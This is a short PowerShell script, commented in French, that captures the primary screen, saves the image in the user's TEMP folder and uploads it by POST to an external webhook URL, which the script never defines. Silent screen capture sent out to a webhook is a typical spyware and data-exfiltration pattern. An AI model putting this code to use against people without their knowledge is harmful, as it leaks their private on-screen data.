# Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
$fileName = "$env:TEMP\screenshot.png"

# Prendre une capture d'écran
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size)

# Vérifier si la capture d'écran est réussie
if (-not $bitmap.GetPixel(0, 0).IsEmpty) {
    # Enregistrer la capture d'écran dans le répertoire temporaire
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envoyer la capture d'écran au webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $fileName -ContentType "multipart/form-data"
} else {
    Write-Host "La capture d'écran a échoué."
}
